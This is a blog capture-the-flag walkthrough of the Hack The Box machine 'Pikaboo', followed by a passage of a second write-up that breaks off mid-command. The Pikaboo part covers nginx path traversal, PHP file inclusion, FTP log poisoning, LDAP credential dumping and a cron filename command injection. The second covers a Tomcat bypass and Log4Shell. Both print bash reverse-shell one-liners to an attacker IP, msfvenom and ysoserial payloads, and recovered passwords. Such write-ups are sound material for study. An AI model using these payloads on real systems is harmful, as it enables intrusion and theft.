[Size: 456] /admin2 (Status: 401) [Size: 456] /adminhelp (Status: 401) [Size: 456] /adminoffice (Status: 401) [Size: 456] /administracja (Status: 401) [Size: 456] As shown, it seems that the server is requesting for authentication when the URL starts with /admin:\n$ curl http://10.10.10.249/adminasdf \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Unauthorized\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\u0026#39;t understand how to supply the credentials required.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Moreover, notice that the server response is from Apache/2.4.38 on port 81. The output of nmap showed that the server on port 80 is nginx.\nThe images that appear in the website are hosted in an nginx server, again looking at the error message:\nPerforming a Directory Path Traversal There could be some misconfiguration between these web servers, and probably it is related to the /admin route. Trying to fuzz looking for a Directory Path Traversal, we obtain the following:\n$ ffuf -u \u0026#39;http://10.10.10.249/admin../FUZZ\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt admin [Status: 401, Size: 456, Words: 42, Lines: 15] javascript [Status: 301, Size: 314, Words: 20, Lines: 10]  [Status: 403, Size: 274, Words: 20, Lines: 10] server-status [Status: 200, Size: 5815, Words: 269, Lines: 114] We see that we can perform a Directory Path Traversal. However, we are not allowed to enter at /admin../admin because we do not have any credentials to use.\nWe can check if there are more directories whose name starts with admin. For instance:\n$ ffuf -u \u0026#39;http://10.10.10.249/admin../adminFUZZ\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt  [Status: 401, Size: 456, Words: 42, Lines: 15] $ ffuf -u \u0026#39;http://10.10.10.249/admin../admin_FUZZ\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt staging [Status: 301, Size: 317, Words: 20, Lines: 10] And we get that there exists a directory called admin_staging, and it is accessible.\nNow we can enter http://10.10.10.249/admin../admin_staging/ bypassing the authentication requirements:\nFinding an LFI Inspecting the website, we see that the server is including PHP files using a GET parameter, as follows:\nWe can fuzz again with ffuf to look for available files:\n$ ffuf -u \u0026#39;http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ.php\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -fw 3272 info [Status: 200, Size: 86990, Words: 6716, Lines: 1170] user [Status: 200, Size: 24978, Words: 7266, Lines: 578] index [Status: 200, Size: 0, Words: 1, Lines: 1] dashboard [Status: 200, Size: 40555, Words: 15297, Lines: 883] tables [Status: 200, Size: 29131, Words: 11707, Lines: 744] typography [Status: 200, Size: 24923, Words: 6989, Lines: 567] When retrieving these files, we notice that the code is being interpreted. This is a sign that we have a Local File Inclusion (LFI) vulnerability.\nTo actually read the source code of PHP files, we can make use of PHP wrappers (for instance, encode the content in Base64 and decode it afterwards). For example, we can try with admin_staging/index.php:\nIf we take the huge Base64 string and decode it, we see a fragment of PHP code that shows how the file inclusion is being handled:\n\u0026lt;?php  if (isset($_GET[\u0026#39;page\u0026#39;])) {  include($_GET[\u0026#39;page\u0026#39;]);  } else {  include(\u0026#39;dashboard.php\u0026#39;);  } ?\u0026gt;However, the server only allows to read specific files (apart from the PHP ones). This configuration can be retrieved from admin_staging/info.php, which contains a phpinfo() and shows that the files can only be included from /var/.\nFTP log poisoning Taking into accoung that there is an FTP server, the idea is to do Log Poisoning using the FTP log. This log file (/var/log/vsftpd.log) is readable:\nThis technique consists of inserting PHP code inside the log file, so that when being included in the website the PHP code is executed.\nLooking at the FTP log file, we see that the username is being reflected, so that is the field where the PHP code must be in order to have Remote Code Execution (RCE).\nLet\u0026rsquo;s use a system command to obtain a reverse shell from the machine (make sure to enter some characters for the password):\n$ ftp 10.10.10.249 Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) Name (10.10.10.249:rocky): \u0026lt;?php system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed. ftp\u0026gt; quit 221 Goodbye. Now that the FTP log is poisoned, we can retrieve it using the LFI, so that the injected PHP code is executed. Using a nc listener, we get access to the machine:\n$ curl \u0026#39;http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log\u0026#39; $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.249. Ncat: Connection from 10.10.10.249:60272. bash: cannot set terminal process group (664): Inappropriate ioctl for device bash: no job control in this shell www-data@pikaboo:/var/www/html/admin_staging$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@pikaboo:/var/www/html/admin_staging$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@pikaboo:/var/www/html/admin_staging$ export TERM=xterm www-data@pikaboo:/var/www/html/admin_staging$ export SHELL=bash www-data@pikaboo:/var/www/html/admin_staging$ stty rows 50 columns 158 System enumeration We can read the user.txt flag as www-data, although being inside the home directory of pwnmeow:\nwww-data@pikaboo:/var/www/html/admin_staging$ ls -l /home total 560 drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul 6 20:02 pwnmeow www-data@pikaboo:/var/www/html/admin_staging$ ls -la /home/pwnmeow/ total 580 drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul 6 20:02 . drwxr-xr-x 3 root root 4096 May 10 10:26 .. lrwxrwxrwx 1 root root 9 Jul 6 20:02 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 pwnmeow pwnmeow 220 May 10 10:26 .bash_logout -rw-r--r-- 1 pwnmeow pwnmeow 3526 May 10 10:26 .bashrc -rw-r--r-- 1 pwnmeow pwnmeow 807 May 10 10:26 .profile lrwxrwxrwx 1 root root 9 Jul 6 20:01 .python_history -\u0026gt; /dev/null -r--r----- 1 pwnmeow www-data 33 Aug 29 22:20 user.txt www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt f3417b113fe715a58e02f9e29fe6c736 Now we can enumerate open ports from inside the machine and discover that port 389 (LDAP) is open:\nwww-data@pikaboo:/var/www/html/admin_staging$ cd / www-data@pikaboo:/$ for i in $(seq 1 65535); do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/127.0.0.1/$i \u0026amp;\u0026amp; echo \u0026#34;Port $i open\u0026#34;; done Port 21 open Port 22 open Port 80 open Port 81 open Port 389 open An easier way to enumerate internal open ports is using netstat:\nwww-data@pikaboo:/$ netstat -nat Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:81 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:389 0.0.0.0:* LISTEN tcp 1 0 127.0.0.1:81 127.0.0.1:49896 CLOSE_WAIT tcp 0 0 10.10.10.249:53456 10.10.16.113:4444 ESTABLISHED tcp 0 0 10.10.10.249:51604 10.10.15.128:4444 CLOSE_WAIT tcp 0 138 10.10.10.249:60272 10.10.17.44:4444 ESTABLISHED tcp 0 0 10.10.10.249:59558 10.10.14.29:1234 CLOSE_WAIT tcp 0 0 10.10.10.249:33250 10.10.14.217:4242 ESTABLISHED tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::21 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN We can see that there are some Python files at /opt/pokeapi:\nwww-data@pikaboo:/$ ls -la /opt total 12 drwxr-xr-x 3 root root 4096 May 20 07:17 . drwxr-xr-x 18 root root 4096 Jul 27 09:32 .. drwxr-xr-x 10 root root 4096 Jul 6 18:58 pokeapi www-data@pikaboo:/$ ls -la /opt/pokeapi/ total 104 drwxr-xr-x 10 root root 4096 Jul 6 18:58 . drwxr-xr-x 3 root root 4096 May 20 07:17 .. drwxr-xr-x 2 root root 4096 May 19 12:04 .circleci -rw-r--r-- 1 root root 253 Jul 6 20:17 .dockerignore drwxr-xr-x 9 root root 4096 May 19 12:04 .git drwxr-xr-x 4 root root 4096 May 19 12:04 .github -rwxr-xr-x 1 root root 135 Jul 6 20:16 .gitignore -rw-r--r-- 1 root root 100 Jul 6 20:16 .gitmodules -rw-r--r-- 1 root root 3224 Jul 6 20:17 CODE_OF_CONDUCT.md -rw-r--r-- 1 root root 3857 Jul 6 20:17 CONTRIBUTING.md -rwxr-xr-x 1 root root 184 Jul 6 20:17 CONTRIBUTORS.txt -rw-r--r-- 1 root root 1621 Jul 6 20:16 LICENSE.md -rwxr-xr-x 1 root root 3548 Jul 6 20:16 Makefile -rwxr-xr-x 1 root root 7720 Jul 6 20:17 README.md drwxr-xr-x 6 root root 4096 May 19 12:04 Resources -rw-r--r-- 1 root root 0 Jul 6 20:16 __init__.py -rw-r--r-- 1 root root 201 Jul 6 20:17 apollo.config.js drwxr-xr-x 3 root root 4096 Jul 6 20:16 config drwxr-xr-x 4 root root 4096 May 19 12:14 data -rw-r--r-- 1 root root 1802 Jul 6 20:16 docker-compose.yml drwxr-xr-x 4 root root 4096 May 19 12:04 graphql -rw-r--r-- 1 root root 113 Jul 6 20:16 gunicorn.py.ini -rwxr-xr-x 1 root root 249 Jul 6 20:16 manage.py drwxr-xr-x 4 root root 4096 May 27 05:46 pokemon_v2 -rw-r--r-- 1 root root 375 Jul 6 20:16 requirements.txt -rw-r--r-- 1 root root 86 Jul 6 20:16 test-requirements.txt Inside the /opt/pokeapi/config we find a settings.py with credentials for LDAP:\nwww-data@pikaboo:/$ ls -la /opt/pokeapi/config/ total 28 -rwxr-xr-x 1 root root 0 Jul 6 20:17 __init__.py drwxr-xr-x 2 root root 4096 Jul 6 16:10 __pycache__ -rw-r--r-- 1 root root 783 Jul 6 20:17 docker-compose.py -rwxr-xr-x 1 root root 548 Jul 6 20:17 docker.py -rwxr-xr-x 1 root root 314 Jul 6 20:17 local.py -rwxr-xr-x 1 root root 3080 Jul 6 20:17 settings.py -rwxr-xr-x 1 root root 181 Jul 6 20:17 urls.py -rwxr-xr-x 1 root root 1408 Jul 6 20:17 wsgi.py www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py # ... DATABASES = {  \u0026#34;ldap\u0026#34;: {  \u0026#34;ENGINE\u0026#34;: \u0026#34;ldapdb.backends.ldap\u0026#34;,  \u0026#34;NAME\u0026#34;: \u0026#34;ldap:///\u0026#34;,  \u0026#34;USER\u0026#34;: \u0026#34;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#34;,  \u0026#34;PASSWORD\u0026#34;: \u0026#34;J~42%W?PFHl]g\u0026#34;,  },  \u0026#34;default\u0026#34;: {  \u0026#34;ENGINE\u0026#34;: \u0026#34;django.db.backends.sqlite3\u0026#34;,  \u0026#34;NAME\u0026#34;: \u0026#34;/opt/pokeapi/db.sqlite3\u0026#34;,  } } # ... LDAP enumeration After doing some research on LDAP and ldapsearch (namely, here), we see some useful commands.\nIn ldapsearch we must specify cn=binduser,ou=users,dc=pikaboo,dc=htb as bind DN (Distinguished Name) and dc=pikaboo,dc=htb as base DN to search:\nwww-data@pikaboo:/$ ldapsearch -xD \u0026#39;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#39; -w \u0026#39;J~42%W?PFHl]g\u0026#39; -b \u0026#39;dc=pikaboo,dc=htb\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;dc=pikaboo,dc=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL #  # pikaboo.htb dn: dc=pikaboo,dc=htb objectClass: domain dc: pikaboo  # ftp.pikaboo.htb dn: dc=ftp,dc=pikaboo,dc=htb objectClass: domain dc: ftp  # users, pikaboo.htb dn: ou=users,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # pokeapi.pikaboo.htb dn: dc=pokeapi,dc=pikaboo,dc=htb objectClass: domain dc: pokeapi  # users, ftp.pikaboo.htb dn: ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # groups, ftp.pikaboo.htb dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups  # pwnmeow, users, ftp.pikaboo.htb dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount uid: pwnmeow cn: Pwn sn: Meow loginShell: /bin/bash uidNumber: 10000 gidNumber: 10000 homeDirectory: /home/pwnmeow userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==  # binduser, users, pikaboo.htb dn: cn=binduser,ou=users,dc=pikaboo,dc=htb cn: binduser objectClass: simpleSecurityObject objectClass: organizationalRole userPassword:: Sn40MiVXP1BGSGxdZw==  # users, pokeapi.pikaboo.htb dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # groups, pokeapi.pikaboo.htb dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups  # search result search: 2 result: 0 Success  # numResponses: 11 # numEntries: 10 We can see what permissions does pwnmeow have over FTP. Let\u0026rsquo;s now add dc=ftp to the base DN to obtain fewer results:\nwww-data@pikaboo:/$ ldapsearch -xD \u0026#39;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#39; -w \u0026#39;J~42%W?PFHl]g\u0026#39; -b \u0026#39;dc=ftp,dc=pikaboo,dc=htb\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;dc=ftp,dc=pikaboo,dc=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL #  # ftp.10.10.10.249 dn: dc=ftp,dc=pikaboo,dc=htb objectClass: domain dc: ftp  # users, ftp.10.10.10.249 dn: ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # groups, ftp.10.10.10.249 dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups  # pwnmeow, users, ftp.10.10.10.249 dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount uid: pwnmeow cn: Pwn sn: Meow loginShell: /bin/bash uidNumber: 10000 gidNumber: 10000 homeDirectory: /home/pwnmeow userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==  # search result search: 2 result: 0 Success  # numResponses: 5 # numEntries: 4 Now, we are able to connect via FTP as pwnmeow especifying the following password:\n$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d _G0tT4_C4tcH_\u0026#39;3m_4lL!_ Finding a Cron job After that, we can check that pwnmeow is in the ftp group and list files that belong to this group:\nwww-data@pikaboo:/$ cat /etc/group | grep pwnmeow pwnmeow:x:1000:pwnmeow ftp:x:115:pwnmeow www-data@pikaboo:/$ find / -group ftp 2\u0026gt;/dev/null /srv/ftp /srv/ftp/growth_rate_prose /srv/ftp/ability_changelog_prose /srv/ftp/types /srv/ftp/item_names /srv/ftp/language_names ... On the other hand, we can try to list Python scripts as follows:\nwww-data@pikaboo:/$ find / -name *.py 2\u0026gt;/dev/null | grep -vE \u0026#39;python|share\u0026#39; /usr/local/bin/django-admin.py /opt/pokeapi/__init__.py /opt/pokeapi/manage.py /opt/pokeapi/data/__init__.py /opt/pokeapi/data/v2/__init__.py /opt/pokeapi/data/v2/build.py /opt/pokeapi/config/wsgi.py /opt/pokeapi/config/local.py /opt/pokeapi/config/__init__.py /opt/pokeapi/config/docker.py /opt/pokeapi/config/settings.py /opt/pokeapi/config/urls.py /opt/pokeapi/config/docker-compose.py /opt/pokeapi/pokemon_v2/__init__.py /opt/pokeapi/pokemon_v2/migrations/0006_auto_20200725_2205.py /opt/pokeapi/pokemon_v2/migrations/__init__.py /opt/pokeapi/pokemon_v2/migrations/0001_squashed_0002_auto_20160301_1408.py /opt/pokeapi/pokemon_v2/migrations/0009_pokemontypepast.py /opt/pokeapi/pokemon_v2/migrations/0005_auto_20200709_1930.py /opt/pokeapi/pokemon_v2/migrations/0002_itemsprites_pokemonformsprites_pokemonsprites.py /opt/pokeapi/pokemon_v2/migrations/0007_auto_20200815_0610.py /opt/pokeapi/pokemon_v2/migrations/0008_auto_20201123_2045.py /opt/pokeapi/pokemon_v2/migrations/0004_iso639length_20191217.py /opt/pokeapi/pokemon_v2/migrations/0003_auto_20160530_1132.py /opt/pokeapi/pokemon_v2/migrations/0010_pokemonformtype.py /opt/pokeapi/pokemon_v2/urls.py /opt/pokeapi/pokemon_v2/test_models.py /opt/pokeapi/pokemon_v2/serializers.py /opt/pokeapi/pokemon_v2/models.py /opt/pokeapi/pokemon_v2/tests.py /opt/pokeapi/pokemon_v2/api.py There is a file called /usr/local/bin/django-admin.py. In fact, inside this directory there is a Cron job:\nwww-data@pikaboo:/$ ls -l /usr/local/bin total 44 drwxr-xr-x 2 root root 4096 Jul 6 18:57 __pycache__ -rwxr-xr-x 1 root root 218 May 19 12:07 coverage -rwxr-xr-x 1 root root 218 May 19 12:07 coverage-3.7 -rwxr-xr-x 1 root root 218 May 19 12:07 coverage3 -rwxr--r-- 1 root root 6444 Jun 1 10:55 csvupdate -rwxr--r-- 1 root root 116 Jun 1 09:40 csvupdate_cron -rwxr-xr-x 1 root root 266 Jul 6 18:57 django-admin -rwxr-xr-x 1 root root 125 Jul 6 18:57 django-admin.py -rwxr-xr-x 1 root root 220 May 19 12:07 gunicorn -rwxr-xr-x 1 root root 219 Jul 6 18:55 sqlformat www-data@pikaboo:/tmp$ cat /usr/local/bin/csvupdate_cron #!/bin/bash  for d in /srv/ftp/* do  cd $d  /usr/local/bin/csvupdate $(basename $d) *csv  /usr/bin/rm -rf * done This Cron job is executing csvupdate, which is a Perl script:\nroot@pikaboo:/srv/ftp/abilities# cat /usr/local/bin/csvupdate #!/usr/bin/perl  ################################################################## # Script for upgrading PokeAPI CSV files with FTP-uploaded data. # # # # Usage: # # ./csvupdate \u0026lt;type\u0026gt; \u0026lt;file(s)\u0026gt; # # # # Arguments: # # - type: PokeAPI CSV file type # # (must have the correct number of fields) # # - file(s): list of files containing CSV data # ##################################################################  use strict; use warnings; use Text::CSV;  my $csv_dir = \u0026#34;/opt/pokeapi/data/v2/csv\u0026#34;;  my %csv_fields = (  \u0026#39;abilities\u0026#39; =\u0026gt; 4,  \u0026#39;ability_changelog\u0026#39; =\u0026gt; 3,  \u0026#39;ability_changelog_prose\u0026#39; =\u0026gt; 3,  \u0026#39;ability_flavor_text\u0026#39; =\u0026gt; 4,  \u0026#39;ability_names\u0026#39; =\u0026gt; 3,  \u0026#39;ability_prose\u0026#39; =\u0026gt; 4,  # ...  \u0026#39;version_group_pokemon_move_methods\u0026#39; =\u0026gt; 2,  \u0026#39;version_group_regions\u0026#39; =\u0026gt; 2,  \u0026#39;version_groups\u0026#39; =\u0026gt; 4,  \u0026#39;version_names\u0026#39; =\u0026gt; 3,  \u0026#39;versions\u0026#39; =\u0026gt; 3 );   if($#ARGV \u0026lt; 1) {  die \u0026#34;Usage: $0 \u0026lt;type\u0026gt; \u0026lt;file(s)\u0026gt;\\n\u0026#34;; }  my $type = $ARGV[0]; if(!exists $csv_fields{$type}) {  die \u0026#34;Unrecognised CSV data type: $type.\\n\u0026#34;; }  my $csv = Text::CSV-\u0026gt;new({ sep_char =\u0026gt; \u0026#39;,\u0026#39; });  my $fname = \u0026#34;${csv_dir}/${type}.csv\u0026#34;; open(my $fh, \u0026#34;\u0026gt;\u0026gt;\u0026#34;, $fname) or die \u0026#34;Unable to open CSV target file.\\n\u0026#34;;  shift; for(\u0026lt;\u0026gt;) {  chomp;  if($csv-\u0026gt;parse($_))  {  my @fields = $csv-\u0026gt;fields();  if(@fields != $csv_fields{$type})  {  warn \u0026#34;Incorrect number of fields: \u0026#39;$_\u0026#39;\\n\u0026#34;;  next;  }  print $fh \u0026#34;$_\\n\u0026#34;;  } }  close($fh); Exploiting a command injection This csvupdate_cron script is vulnerable to command injection because it is using a wildcard on the CSV filename. To exploit this, the idea is to store a file with a malicious filename that contains a system command.\nThis malicious file must be stored inside a directory of /srv/ftp:\nwww-data@pikaboo:/ ls -la /srv/ftp total 712 drwxr-xr-x 176 root ftp 12288 May 20 2021 . drwxr-xr-x 3 root root 4096 May 10 2021 .. drwx-wx--- 2 root ftp 4096 Dec 4 14:20 abilities drwx-wx--- 2 root ftp 4096 May 20 2021 ability_changelog drwx-wx--- 2 root ftp 4096 May 20 2021 ability_changelog_prose drwx-wx--- 2 root ftp 4096 May 20 2021 ability_flavor_text drwx-wx--- 2 root ftp 4096 May 20 2021 ability_names drwx-wx--- 2 root ftp 4096 May 20 2021 ability_prose ... drwx-wx--- 2 root ftp 4096 May 20 2021 version_group_pokemon_move_methods drwx-wx--- 2 root ftp 4096 May 20 2021 version_group_regions drwx-wx--- 2 root ftp 4096 May 20 2021 version_groups drwx-wx--- 2 root ftp 4096 May 20 2021 version_names drwx-wx--- 2 root ftp 4096 May 20 2021 versions Let\u0026rsquo;s use the one called versions, for example. Now, we can upload the malicious file with a special filename and get a reverse shell as root:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx Now we must upload the file and name it remotely with the injected command:\n$ touch file $ ftp pwnmeow@10.10.10.249 Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx-wx--- 2 ftp ftp 4096 May 20 09:54 abilities drwx-wx--- 2 ftp ftp 4096 May 20 08:01 ability_changelog ... drwx-wx--- 2 ftp ftp 4096 May 20 08:01 version_names drwx-wx--- 2 ftp ftp 4096 Sep 12 22:29 versions 226 Directory send OK. ftp\u0026gt; cd versions 250 Directory successfully changed. ftp\u0026gt; put (local-file) file (remote-file) \u0026#34;|echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv\u0026#34; 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. As shown, the malicious filename is crafted so that the command executed by the Cron job is:\n/usr/local/bin/csvupdate $(basename $d) |echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv The use of the pipes (|) was the only way found to execute the command properly. Before, semicolons and OR statements were tried, but none of them worked.\nAnd the reason why this kind of command injection worked is because of some Perl weird behavior (it is called: Perl open argument injection, more information here).\nFinally, we get access as root and read the root.txt flag:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.249. Ncat: Connection from 10.10.10.249:47382. bash: cannot set terminal process group (7636): Inappropriate ioctl for device bash: no job control in this shell root@pikaboo:/srv/ftp/versions# cat /root/root.txt 3904cd5b02fd88be5264107d52282460 In addition, all the steps to compromise the machine were written into a Python script called autopwn.py (detailed explanation here):\n$ python3 autopwn.py 10.10.17.44 [*] FTP log (/var/log/vsftpd.log) has been poisoned [+] Trying to bind to :: on port 4444: Done [+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47390 [*] Found user: pwnmeow [!] Found user.txt: f3417b113fe715a58e02f9e29fe6c736 [*] Found LDAP user: cn=binduser,ou=users,dc=pikaboo,dc=htb [*] Found LDAP password: J~42%W?PFHl]g [*] Found FTP password: _G0tT4_C4tcH_\u0026#39;3m_4lL!_ [*] Stored malicious file with injected command in filename [+] Trying to bind to :: on port 4444: Done [+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47396 [!] Found root.txt: 3904cd5b02fd88be5264107d52282460 [+] Got shell as root [*] Switching to interactive mode root@pikaboo:/srv/ftp/abilities# ","image":"/images/HTB/Pikaboo/Pikaboo.png","permalink":"https://7rocky.github.io/en/htb/pikaboo/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch","time":15,"title":"Pikaboo"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.138   Release: 03 / 12 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.138 -p 21,22,80,8080 Nmap scan report for 10.10.11.138 Host is up (0.049s latency).  PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Ultimate Hacking Championship 8080/tcp filtered http-proxy Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.18 seconds This machine has port 22 (SSH) and 80 (HTTP) open. Ports 21 (FTP) and 8080 (HTTP) are filtered.\nWeb enumeration If we go to http://10.10.11.138 we will see a page like this:\nLet\u0026rsquo;s apply fuzzing with ffuf to see if there are some useful routes:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.138/FUZZ images [Status: 302, Size: 0, Words: 1, Lines: 1] admin [Status: 403, Size: 277, Words: 20, Lines: 10] manager [Status: 403, Size: 277, Words: 20, Lines: 10]  [Status: 200, Size: 489, Words: 23, Lines: 33] server-status [Status: 403, Size: 277, Words: 20, Lines: 10] Looking at this routes, it seems that the server is running Tomcat. One can verify this searching for a non-existing resource. Namely, /robots.txt:\nIt is using Tomcat/9.0.31. However, nmap said that the server is Apache/2.4.41. Also notice that port 8080 was filtered.\nTomcat\u0026rsquo;s default port is 8080. Maybe the configuration is Apache on port 80 redirecting requests to Tomcat on port 8080. Apache is blocking direct access to /manager (which is the administration panel for Tomcat). This configuration can lead to path traversal issues.\nBypassing Apache restrictions Looking at HackTricks, we can use /;param=value/manager/html to bypass the Apache blocking configuration and access the Tomcat administration panel. We are asked for credentials, but the default ones (tomcat:tomcat) are correct:\nNow we can perform a common Tomcat exploitation. That is, upload a malicious WAR file to obtain a reverse shell on the server. Let\u0026rsquo;s use msfvenom:\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f war -o rev.war Payload size: 1106 bytes Final size of war file: 1106 bytes Saved as: rev.war And now we can upload it. But, there is an error:\n[org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.] As it is shown, the server tells that the maximum size is 1 B. So, we cannot exploit Tomcat in the conventional way.\nExploiting Log4j We may notice that this error message comes from a log manager such as Log4j. This Java package has the feature to perform JNDI (Java Naming and Directory Interface) lookups. Maybe it is vulnerable to CVE-2021-44228 (Log4Shell).\nUsing Burp Suite to examine the POST request to upload the malicious WAR file, we can see that the parameter name is deployWar, which is reflected on the error message. We can change this name to a common Log4j exploit payload (${jndi:ldap://\u0026lt;ip\u0026gt;/a}) and check if we receive a connection.\nFor this, we can listen on port 389 (LDAP) using nc:\n$ nc -nlvp 389 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::389 Ncat: Listening on 0.0.0.0:389 Then we can make the POST request from Burp Suite:\nAnd indeed we receive a connection:\n$ nc -nlvp 389 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::389 Ncat: Listening on 0.0.0.0:389 Ncat: Connection from 10.10.11.138. Ncat: Connection from 10.10.11.138:49432. 0  ` Now that we know the server performs JNDI lookups, we can use a malicious LDAP server to inject a serialized Java object that will send us a reverse shell.\nFor this purpose, we will be using JNDI-Exploit-Kit to expose an LDAP server and ysoserial-modified to craft the malicious serialized object.\nFirst, we create the payload:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ java -jar target/ysoserial-modified.jar CommonsCollections5 bash \u0026#39;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | 